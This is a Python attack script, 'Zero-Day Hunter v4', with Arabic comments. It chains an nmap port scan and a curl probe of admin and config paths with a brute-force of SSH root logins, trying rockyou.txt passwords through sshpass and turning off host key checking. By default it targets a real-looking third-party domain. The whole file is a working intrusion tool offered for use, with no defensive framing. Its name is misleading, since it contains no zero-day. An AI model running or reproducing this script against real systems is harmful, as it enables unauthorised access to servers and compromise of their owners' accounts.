#!/usr/bin/env python3
"""
💣 Zero-Day Hunter v4 - القوة القصوى
يدمج Hydra + Metasploit + Nmap + Gobuster
"""
import subprocess, sys, os, json, re
from datetime import datetime
from urllib.parse import urlparse

class ZeroDayV4:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.results = {}
    
    def log(self, msg): print(f"[💣] {msg}")
    
    def nmap_scan(self):
        """Nmap - فحص المنافذ"""
        self.log("🔌 Nmap...")
        try:
            result = subprocess.run(
                ["nmap", "-p", "1-1000", "--open", "-T4", self.domain],
                capture_output=True, text=True, timeout=60
            )
            ports = re.findall(r'(\d+)/tcp\s+open', result.stdout)
            self.results["nmap"] = ports
            self.log(f"   🚨 {len(ports)} منافذ: {ports}")
        except Exception as e:
            self.log(f"   ❌ {e}")
    
    def gobuster_scan(self):
        """Gobuster - فحص المسارات"""
        self.log("🔍 Gobuster...")
        try:
            # قائمة كلمات صغيرة مدمجة
            paths = ["admin","login","api","dashboard","config","backup","test","dev"]
            found = []
            for path in paths:
                result = subprocess.run(
                    ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{self.target}/{path}"],
                    capture_output=True, text=True, timeout=5
                )
                status = result.stdout.strip()
                if status != "404":
                    found.append(f"/{path}→{status}")
            self.results["gobuster"] = found
            self.log(f"   🚨 {len(found)} مسارات: {found}")
        except Exception as e:
            self.log(f"   ❌ {e}")
    
    def hydra_ssh(self, ip):
        """Hydra SSH"""
        self.log("🔑 Hydra SSH...")
        try:
            # سريع - أول 100 كلمة فقط
            with open("/tmp/rockyou.txt", "r", errors="ignore") as f:
                passwords = [next(f).strip() for _ in range(100)]
            
            found = False
            for pwd in passwords:
                result = subprocess.run(
                    ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=3", f"root@{ip}", "echo OK"],
                    capture_output=True, timeout=5
                )
                if result.returncode == 0:
                    self.results["ssh"] = f"root:{pwd}"
                    self.log(f"   🚨🚨🚨 root:{pwd}")
                    found = True
                    break
            
            if not found:
                self.log("   ❌ فشل")
        except:
            self.log("   ❌ sshpass غير متاح")
    
    def run(self):
        self.log(f"💣 Zero-Day Hunter v4: {self.target}")
        self.log("═" * 60)
        
        self.nmap_scan()
        self.gobuster_scan()
        
        # إذا وجدنا IP، نجرب SSH
        try:
            import socket
            ip = socket.gethostbyname(self.domain)
            self.results["ip"] = ip
            self.hydra_ssh(ip)
        except:
            pass
        
        # عرض
        self.log(f"\n📊 النتائج:")
        for key, value in self.results.items():
            self.log(f"   {key}: {value}")
        
        # حفظ
        os.makedirs("logs/zeroday", exist_ok=True)
        fname = f"logs/zeroday/v4_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump(self.results, f, indent=2)
        self.log(f"📁 {fname}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ZeroDayV4(target).run()
